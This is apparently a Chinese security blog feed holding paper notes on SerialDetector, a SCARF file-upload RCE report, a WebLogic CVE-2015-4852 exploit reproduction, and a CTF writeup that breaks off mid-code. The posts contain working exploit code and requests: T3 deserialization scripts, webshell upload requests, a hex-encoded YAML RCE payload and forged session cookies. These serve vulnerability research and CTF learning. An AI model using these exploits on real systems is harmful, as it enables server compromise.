<h3 id="5-2-挑战和限制"><a href="#5-2-挑战和限制" class="headerlink" title="5.2 挑战和限制"></a>5.2 挑战和限制</h3><h4 id="①虚拟函数调用"><a href="#①虚拟函数调用" class="headerlink" title="①虚拟函数调用"></a>①虚拟函数调用</h4><h4 id="②递归"><a href="#②递归" class="headerlink" title="②递归"></a>②递归</h4><h4 id="③静态字段"><a href="#③静态字段" class="headerlink" title="③静态字段"></a>③静态字段</h4><h4 id="④数组"><a href="#④数组" class="headerlink" title="④数组"></a>④数组</h4><h4 id="⑤不支持的指令"><a href="#⑤不支持的指令" class="headerlink" title="⑤不支持的指令"></a>⑤不支持的指令</h4><h2 id="0x06-Evaluation"><a href="#0x06-Evaluation" class="headerlink" title="0x06 Evaluation"></a>0x06 Evaluation</h2><p>​        SerialDetector首先索引了.NET框架的所有代码并且检测敏感sink的列表。.NET框架由269个程序集、466218个方法和50399个类型。</p>
<p>​        12.4s完成了这步，得到123个敏感sink，因为不是所有sink都能根据输入动态创建新的对象，手动分析过滤了这些敏感sink。</p>
<h3 id="6-1-检测阶段"><a href="#6-1-检测阶段" class="headerlink" title="6.1 检测阶段"></a>6.1 检测阶段</h3><p>​        实验目标程序：.NET框架中的OIV和来自YSoSerial.Net项目中使用不安全反序列化器的第三方库。</p>
<p>​        使用不安全反序列化器的反序列化方法作为数据流分析的入口点进行分析，将攻击触发器与YSoSerial中的gadget进行匹配作为有效性的指标。</p>
<p>​        下表中patterns表示每个序列化器的不同OIV模式数，Priority Patterns表示包含公开gadget方法的OIV模式数。</p>
<p><img src="/2023/04/04/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94SerialDetector-Principled-and-Practical-Exploration-of-Object-Injection-Vulnerabilities-for-the-Web/image-20230407220153930.png" alt="image-20230407220153930"></p>
<h3 id="6-2-利用阶段"><a href="#6-2-利用阶段" class="headerlink" title="6.2 利用阶段"></a>6.2 利用阶段</h3><p>​        实验目标程序：NVD中搜索.NET and CWE-502，得到55个记录，对这些手动分析发现11个真实检测到漏洞，而且仅仅有5个存在漏洞的应用可以搭建。使用SerialDetector分析下表的应用，包括7个不同的应用，10个OIVS。SerialDetector检测到除Telerik UI产品之外的所有应用程序中不安全反序列化程序和相关入口点的脆弱调用，该UI产品使用反射API调用JavaScript序列化程序的不安全配置。当前版本的序列检测器不支持重构调用图的<strong>反射（Reflection）</strong>，并且忽略这样的调用。Entry Points w/o Threat Model列表示到达不安全序列化器调用的入口点的数量，然而有些入口点永远不会被执行。Entry Points w/ Threat Model列报告了SerialDetector的结果。</p>
<p><img src="/2023/04/04/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94SerialDetector-Principled-and-Practical-Exploration-of-Object-Injection-Vulnerabilities-for-the-Web/image-20230407222213898.png" alt="image-20230407222213898"></p>
<p>PS:上表中的后两列对应的三个漏洞为作者报告的0day漏洞。</p>
<p>​        CVE-2019-0604中6283的原因是SharePoint服务器中的代码与其主要程序集Microsoft.SharePoint.dll之间的紧密耦合，以及方法对虚拟调用的过估计。</p>
<p>​        <strong>性能：</strong>分析速度相当快，平均分析时间47.4秒，作者的流不敏感方法减少了堆图的大小，这使得SerialDetector能够更快地应用摘要和合并location，从而提高了整体分析时间。另一个提高可伸缩性的因素是轻量级上下文敏感分析的使用。</p>
<p>​        <strong>误报：</strong>我们还发现了从未被调用的攻击触发器。造成这些假阳性的根本原因是数据流分析的流-不敏感性。对流不敏感的方法允许我们以牺牲分析的精度为代价来控制堆的大小。另一方面，我们的结果显示，安全分析师应该手动审查的模式的数量并不庞大。</p>
<h2 id="0x07-In-depth-analysis-of-Azure-Devops-Server"><a href="#0x07-In-depth-analysis-of-Azure-Devops-Server" class="headerlink" title="0x07 In-depth analysis of Azure Devops Server"></a>0x07 In-depth analysis of Azure Devops Server</h2><p>介绍了三个对于Azure Devops Server的威胁模型。</p>
<p>下图路径：1，2a/2b/2c</p>
<p><img src="/2023/04/04/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94SerialDetector-Principled-and-Practical-Exploration-of-Object-Injection-Vulnerabilities-for-the-Web/image-20230407224830609.png" alt="image-20230407224830609"></p>
<p>下图路径：1a,2a  /  1b,2b,3b</p>
<p><img src="/2023/04/04/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94SerialDetector-Principled-and-Practical-Exploration-of-Object-Injection-Vulnerabilities-for-the-Web/image-20230407224932925.png" alt="image-20230407224932925"></p>
<p>下图路径：1a,2a  / 1b,2b,3b,4b</p>
<p><img src="/2023/04/04/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94SerialDetector-Principled-and-Practical-Exploration-of-Object-Injection-Vulnerabilities-for-the-Web/image-20230407225211627.png" alt="image-20230407225211627"></p>
]]></content>
  </entry>
  <entry>
    <title>SCARF Vulnerability Report</title>
    <url>/2022/03/24/SCARF-Vulnerability-Report/</url>
    <content><![CDATA[<p>SCARF Vulnerability Report</p>
<a id="more"></a>

<p>generaloptions.php in Paul Tarjan Stanford Conference And Research Forum (SCARF) before 20070227 exists a remote command execution vulnerability. </p>
<p>In generaloptions.php,</p>
<p><img src="/2022/03/24/SCARF-Vulnerability-Report/image-20220324132208980.png" alt="image-20220324132208980"></p>
<p>The fifth line will modify the data in the options table in the database according to the key value entered in the POST method in the HTTP request.<br>The options table structure in the database is as follows:</p>
<p><img src="/2022/03/24/SCARF-Vulnerability-Report/image-20220324132232923.png" alt="image-20220324132232923"></p>
<p>Here you can modify any value field in the options table,<br>In line 11, traverse each uploaded file, query the corresponding <em>value</em> value in the <em>options</em> table according to $name, and then call the move_uploaded_file function to move the uploaded temporary file to the path corresponding to the <em>value</em> value.<br>First enter Background Image as shell.php in post mode.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;scarf&#x2F;generaloptions.php HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.59.182</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.66 Safari&#x2F;537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 33</span><br><span class="line"></span><br><span class="line">Background_Image&#x3D;shell.php&amp;submit</span><br></pre></td></tr></table></figure>

<p>Then upload the file whose content is <code>&lt;?php phpinfo();?&gt;</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;scarf&#x2F;generaloptions.php HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.59.182</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.66 Safari&#x2F;537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryCgwbsOJquAiouDkj</span><br><span class="line">Content-Length: 312</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryCgwbsOJquAiouDkj</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;Background Image&quot;; filename&#x3D;&quot;a&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">------WebKitFormBoundaryCgwbsOJquAiouDkj</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;submit&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryCgwbsOJquAiouDkj--</span><br></pre></td></tr></table></figure>

<p>Then visit <a href="http://192.168.59.182/scarf/shell.php" target="_blank" rel="noopener">http://192.168.59.182/scarf/shell.php</a></p>
<p><img src="/2022/03/24/SCARF-Vulnerability-Report/image-20220324132428013.png" alt="image-20220324132428013"></p>
]]></content>
  </entry>
  <entry>
    <title>2021ByteCTFweb题目</title>
    <url>/2021/10/19/2021ByteCTFweb%E9%A2%98%E7%9B%AE/</url>
    <content><![CDATA[<p>ByteCTF几道Web题目复现</p>
<a id="more"></a>
]]></content>
  </entry>
  <entry>
    <title>weblogic漏洞分析——CVE-2015-4852</title>
    <url>/2020/12/04/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E2%80%94%E2%80%94CVE-2015-4852/</url>
    <content><![CDATA[<p>参考几位师傅的文章复现分析下weblogic的漏洞</p>
<a id="more"></a>

<p>环境搭建参考前篇文章</p>
<h2 id="0x01-t3协议"><a href="#0x01-t3协议" class="headerlink" title="0x01 t3协议"></a>0x01 t3协议</h2><p>参考Y4er师傅的文章，在weblogic的<code>~/Oracle/Middleware/user_projects/domains/base_domain/bin/stopWebLogic.sh</code>文件中使用了<code>t3://</code>协议，然后运行该脚本，之后利用tcpdump抓取t3协议包，tcpdump命令语法如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Usage: tcpdump [-aAbdDefhHIJKlLnNOpqStuUvxX#] [ -B size ] [ -c count ]</span><br><span class="line">		[ -C file_size ] [ -E algo:secret ] [ -F file ] [ -G seconds ]</span><br><span class="line">		[ -i interface ] [ -j tstamptype ] [ -M secret ] [ --number ]</span><br><span class="line">		[ -Q in|out|inout ]</span><br><span class="line">		[ -r file ] [ -s snaplen ] [ --time-stamp-precision precision ]</span><br><span class="line">		[ --immediate-mode ] [ -T type ] [ --version ] [ -V file ]</span><br><span class="line">		[ -w file ] [ -W filecount ] [ -y datalinktype ] [ -z postrotate-command ]</span><br><span class="line">		[ -Z user ] [ expression ]</span><br></pre></td></tr></table></figure>

<p>第一次执行脚本后没有截到包，查看stopWeblogic.sh文件，发现里面为<code>t3://virtual-machine:7001</code>，可能是在虚拟机里搭建的原因，修改为虚拟机对应的IP，</p>
<p><code>sudo tcpdump -i any -w dump.pcap</code></p>
<p><code>./stopWeblogic.sh</code></p>
<p><img src="/2020/12/04/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E2%80%94%E2%80%94CVE-2015-4852/image-20201204194304550.png" alt="image-20201204194304550"></p>
<p>搜索<code>aced</code>可以得到上图，然后追踪流</p>
<p><img src="/2020/12/04/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E2%80%94%E2%80%94CVE-2015-4852/image-20201204194417570.png" alt="image-20201204194417570"></p>
<p><img src="/2020/12/04/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E2%80%94%E2%80%94CVE-2015-4852/image-20201204202615084.png" alt="image-20201204202615084"></p>
<p>参考网上的文章，得到T3协议规范如下图所示：</p>
<blockquote>
<p><img src="https://y4er.com/img/uploads/20200130161825.png" alt="20200130161825"></p>
</blockquote>
<p>因为在第一部分会检验整个包的长度，所以伪造第2-6部分是失败的，看网上文章说可以直接在第二个部分改为恶意序列化数据，并更新第一部分的前4 个长度字节，然后发送给服务端就可以触发反序列化。</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(host, port)</span>:</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server_address = (host, int(port))</span><br><span class="line">    data = <span class="string">""</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sock.connect(server_address)</span><br><span class="line">        headers = <span class="string">'t3 12.2.1\nAS:255\nHL:19\n\n'</span>.format(port)</span><br><span class="line">        sock.sendall(headers)</span><br><span class="line">        data = sock.recv(<span class="number">2</span>)</span><br><span class="line">        f = open(<span class="string">'./tmp'</span>, <span class="string">'rb'</span>)</span><br><span class="line">        payload_obj = f.read()</span><br><span class="line">        f.close()</span><br><span class="line">        payload1 = <span class="string">"000005bc016501ffffffffffffffff0000006a0000ea600000001900abfd73bd92748c5603c5aff9ffd43a6bb4c295fb51ac6a4d027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000"</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">        payload2 = payload_obj</span><br><span class="line">        payload = payload1 + payload2<span class="comment"># + payload3</span></span><br><span class="line"></span><br><span class="line">        payload = struct.pack(<span class="string">'&gt;I'</span>, len(payload)) + payload[<span class="number">4</span>:]<span class="comment">#更新长度</span></span><br><span class="line"></span><br><span class="line">        sock.send(payload)</span><br><span class="line">        data = sock.recv(<span class="number">4096</span>)</span><br><span class="line">    <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">u'socket 连接异常！'</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        sock.close()</span><br><span class="line"></span><br><span class="line">exp(<span class="string">'192.168.59.131'</span>, <span class="number">7001</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections1 &quot;touch &#x2F;tmp&#x2F;exp&quot; &gt; .&#x2F;CVE-2015-4852deserialize&#x2F;tmp</span><br><span class="line"></span><br><span class="line">python2 exp.py</span><br></pre></td></tr></table></figure>



<blockquote>
<img src="/2020/12/04/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E2%80%94%E2%80%94CVE-2015-4852/jndiarch.gif" alt="img" style="zoom: 150%;">

<p><a href="https://seaii-blog.com/index.php/2019/12/29/92.html" target="_blank" rel="noopener">https://seaii-blog.com/index.php/2019/12/29/92.html</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">016501ffffffffffffffff0000006a0000ea600000001900abfd73bd92748c5603c5aff9ffd43a6bb4c295fb51ac6a4d027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000</span><br><span class="line"></span><br><span class="line">016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006</span><br></pre></td></tr></table></figure>

<h2 id="0x02-调试分析"><a href="#0x02-调试分析" class="headerlink" title="0x02 调试分析"></a>0x02 调试分析</h2><p>调试断点：wlthint3client.jar:weblogic.rjvm.InboundMsgAbbrev</p>
<p><a href="https://y4er.com/post/weblogic-cve-2015-4852/" target="_blank" rel="noopener">https://y4er.com/post/weblogic-cve-2015-4852/</a></p>
<p><a href="https://seaii-blog.com/index.php/2019/12/29/92.html" target="_blank" rel="noopener">https://seaii-blog.com/index.php/2019/12/29/92.html</a></p>
]]></content>
      <tags>
        <tag>weblogic</tag>
      </tags>
  </entry>
  <entry>
    <title>2020祥云杯Web题目writeup</title>
    <url>/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/</url>
    <content><![CDATA[<p>没有和学长一起打，干不动，太菜了。</p>
<a id="more"></a>

<h1 id="0x01-profile-system"><a href="#0x01-profile-system" class="headerlink" title="0x01 profile system"></a>0x01 profile system</h1><p>题目源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, flash, redirect, send_file,session</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = os.path.join(os.curdir, <span class="string">"uploads"</span>)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'Th1s_is_A_Sup333er_s1cret_k1yyyyy'</span></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">'yaml'</span>,<span class="string">'yml'</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower()</span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    session[<span class="string">'priviledge'</span>] = <span class="string">'guest'</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"home.html"</span>)</span><br><span class="line"><span class="meta">@app.route("/upload", methods=["POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    file = request.files[<span class="string">"file"</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">        flash(<span class="string">'No selected file'</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">"/"</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> (allowed_file(file.filename) <span class="keyword">in</span> ALLOWED_EXTENSIONS):</span><br><span class="line">        flash(<span class="string">'Please upload yaml/yml only.'</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">"/"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dirname = md5(request.remote_addr.encode()).hexdigest()</span><br><span class="line">        filename = file.filename</span><br><span class="line">        session[<span class="string">'filename'</span>] = filename </span><br><span class="line">        upload_directory = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], dirname)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(upload_directory):</span><br><span class="line">            os.mkdir(upload_directory)</span><br><span class="line">        upload_path = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], dirname, filename)</span><br><span class="line">        file.save(upload_path)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">"uploaded.html"</span>,path = os.path.join(dirname, filename))</span><br><span class="line"><span class="meta">@app.route("/uploads/&lt;path:path&gt;")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uploads</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> send_file(os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], path))</span><br><span class="line"><span class="meta">@app.route("/view")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">()</span>:</span></span><br><span class="line">    dirname = md5(request.remote_addr.encode()).hexdigest()</span><br><span class="line">    realpath = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], dirname,session[<span class="string">'filename'</span>]).replace(<span class="string">'..'</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'priviledge'</span>] ==<span class="string">'elite'</span> <span class="keyword">and</span> os.path.isfile(realpath):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> open(realpath,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                data = f.read()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> re.fullmatch(<span class="string">b"^[ -\-/-\]a-&#125;\n]*$"</span>,data, flags=re.MULTILINE):</span><br><span class="line">                    info = &#123;<span class="string">'user'</span>: <span class="string">'elite-user'</span>&#125;</span><br><span class="line">                    flash(<span class="string">'Sth weird...'</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    info = yaml.load(data)</span><br><span class="line">                <span class="keyword">if</span> info[<span class="string">'user'</span>] == <span class="string">'Administrator'</span>:</span><br><span class="line">                    flash(<span class="string">'Welcome admin!'</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">raise</span> ()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            info = &#123;<span class="string">'user'</span>: <span class="string">'elite-user'</span>&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        info = &#123;<span class="string">'user'</span>: <span class="string">'guest'</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"view.html"</span>,user = info[<span class="string">'user'</span>])</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>,port=<span class="number">8888</span>,threaded=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>/uploads路由存在路径穿越可以读取文件，</p>
<p><img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201123220630565.png" alt="image-20201123220630565"></p>
<p>读取文件后审计源码，可以得到<code>python</code>的<code>session</code>的<code>secret</code>为<code>Th1s_is_A_Sup333er_s1cret_k1yyyyy</code>,有上传<code>yaml、yml</code>文件的功能，在<code>/view</code>路由，会将客户端ip的md5值拼接到upload，然后再拼接<code>session[filename]</code>，之后检查<code>session[&#39;priviledge&#39;] 是否为&#39;elite&#39;</code>和拼接得到的文件名对应的文件是否存在；如果通过检查，则读取文件对应的内容，然后对文件内容进行正则的判断，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> open(realpath,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">	data = f.read()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.fullmatch(<span class="string">b"^[ -\-/-\]a-&#125;\n]*$"</span>,data, flags=re.MULTILINE):</span><br><span class="line">    	info = &#123;<span class="string">'user'</span>: <span class="string">'elite-user'</span>&#125;</span><br><span class="line">        flash(<span class="string">'Sth weird...'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        info = yaml.load(data)</span><br><span class="line">    <span class="keyword">if</span> info[<span class="string">'user'</span>] == <span class="string">'Administrator'</span>:</span><br><span class="line">        flash(<span class="string">'Welcome admin!'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> ()</span><br></pre></td></tr></table></figure>

<img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201123230352889.png" alt="image-20201123230352889" style="zoom:200%;">

<p>上面正则对应的匹配模式如上图，禁止了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.  ^  _  &#96;  ~</span><br></pre></td></tr></table></figure>

<p>这些字符，如果能够通过正则的检测，就会执行yaml.load(data)`，这里有一个yaml的反序列化，<a href="https://hackmd.io/@harrier/uiuctf20" target="_blank" rel="noopener">uiuctf 2020</a>考点和这道题一样，本地生成yaml文件，</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="type">!!python</span><span class="string">/object/new:type</span></span><br><span class="line"><span class="attr">args:</span> <span class="string">["z",</span> <span class="type">!!python</span><span class="string">/tuple</span> <span class="string">[],</span> <span class="string">&#123;"extend":</span> <span class="type">!!python</span><span class="string">/name:exec</span> <span class="string">&#125;]</span></span><br><span class="line"><span class="attr">listitems:</span> <span class="string">"\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x77\x68\x6f\x61\x6d\x69\x20\x3e\x20\x2e\x2f\x75\x70\x6c\x6f\x61\x64\x73\x2f\x34\x64\x39\x65\x38\x31\x39\x65\x37\x35\x34\x32\x62\x33\x34\x62\x38\x30\x35\x32\x36\x32\x61\x39\x61\x30\x65\x66\x61\x64\x38\x37\x2f\x33\x32\x31\x27\x29"</span></span><br></pre></td></tr></table></figure>

<p>转十六进制的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str = <span class="string">"__import__('os').system('whoami &gt; ./uploads/4d9e819e7542b34b805262a9a0efad87/321')"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">''</span>.join([hex(ord(c)).replace(<span class="string">'0x'</span>, <span class="string">'\\x'</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> str_to_hex(str)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>本地测试在win10写文件写出来的换行是<code>\r\n</code>，linux写出来的文件换行是<code>\n</code>，开始用win10写的文件都包含<code>\r</code>，不能通过正则检查，之后用linux就可以了。<code>%0d——\r    %0a——\n</code></p>
</blockquote>
<p><img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201124202931172.png" alt="image-20201124202931172"></p>
<p>为了能够执行到反序列化的点，生成session</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s &quot;Th1s_is_A_Sup333er_s1cret_k1yyyyy&quot; -t &quot;&#123;&#39;priviledge&#39;:&#39;elite&#39;,&#39;filename&#39;:&#39;aa.yaml&#39;&#125;&quot;</span><br><span class="line">eyJmaWxlbmFtZSI6ImFhLnlhbWwiLCJwcml2aWxlZGdlIjoiZWxpdGUifQ.X7zvPw.AKiTGPDlkdsETAUVmGYrxCc_7jk</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201124203341378.png" alt="image-20201124203341378"></p>
<p>之后下载<code>/uploads/4d9e819e7542b34b805262a9a0efad87/321</code>就可以得到结果。</p>
<h1 id="0x02-flaskbot"><a href="#0x02-flaskbot" class="headerlink" title="0x02 flaskbot"></a>0x02 flaskbot</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,request,make_response,redirect,url_for,render_template_string</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe</span><span class="params">(str)</span>:</span> </span><br><span class="line">    black_list = [<span class="string">'flag'</span>,<span class="string">'os'</span>,<span class="string">'system'</span>,<span class="string">'popen'</span>,<span class="string">'import'</span>,<span class="string">'eval'</span>,<span class="string">'chr'</span>,<span class="string">'request'</span>, <span class="string">'subprocess'</span>,<span class="string">'commands'</span>,<span class="string">'socket'</span>,<span class="string">'hex'</span>,<span class="string">'base64'</span>,<span class="string">'*'</span>,<span class="string">'?'</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> str.lower():</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Damn you hacker! You will never"</span></span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guessNum</span><span class="params">(num,name)</span>:</span></span><br><span class="line">    l=<span class="number">0</span></span><br><span class="line">    r=<span class="number">1000000000.0</span></span><br><span class="line">    mid=(l+r)/<span class="number">2.0</span></span><br><span class="line">    ret=<span class="string">""</span></span><br><span class="line">    cnt=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> abs(mid-num)&lt;<span class="number">0.00001</span>:</span><br><span class="line">        cnt=cnt+<span class="number">1</span></span><br><span class="line">        mid=(l+r)/<span class="number">2.0</span></span><br><span class="line">        <span class="keyword">if</span> mid&gt;num:</span><br><span class="line">            r=mid</span><br><span class="line">            ret+=<span class="string">"&#123;0&#125;:&#123;1&#125; is too large&lt;br/&gt;"</span>.format(cnt,mid)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l=mid</span><br><span class="line">            ret+=<span class="string">"&#123;0&#125;:&#123;1&#125; is too small&lt;br/&gt;"</span>.format(cnt,mid)</span><br><span class="line">        <span class="keyword">if</span> cnt &gt; <span class="number">50</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> cnt &lt; <span class="number">50</span>:</span><br><span class="line">        ret+=<span class="string">"&#123;0&#125;:&#123;1&#125; is close enough&lt;br/&gt;I win"</span>.format(cnt,mid)</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        ret+=<span class="string">"Wow! &#123;0&#125; win."</span>.format(safe(name))</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/',methods=['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Hello</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">"POST"</span>:</span><br><span class="line">        user = request.form[<span class="string">'name'</span>]</span><br><span class="line">        resp = make_response(render_template(<span class="string">"guess.html"</span>,name=user))</span><br><span class="line">        resp.set_cookie(<span 